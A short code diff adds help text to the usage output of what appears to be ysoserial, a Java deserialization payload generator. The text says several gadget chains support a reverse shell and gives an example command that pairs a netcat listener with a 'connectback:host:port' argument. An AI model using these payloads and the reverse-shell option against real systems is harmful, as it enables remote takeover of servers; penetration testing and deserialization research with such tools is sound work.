@@ -68,5 +68,12 @@ public class GeneratePayload {
         for (String line : lines) {
             System.err.println("     " + line);
         }
+        
+        System.err.println("  TemplatesImpl payloads have reverse command shell support. Start a netcat");
+        System.err.println("  listener and use connectback:<host>:<port> as the command parameter e.g.\n");
+        System.err.println("    java -jar ysoserial-[version]-all.jar [payload] connectback:10.0.0.2:4444\n");
+        System.err.println("  Payloads with reverse shell support: CommonsBeanutils1, CommonsCollections2,");
+        System.err.println("    CommonsCollections3, CommonsCollections4, JBossInterceptors1, ");
+        System.err.println("    JavassistWels1, Jdk7u21, MozillaRhino1, ROME, Spring1, Spring2");
     }
 }
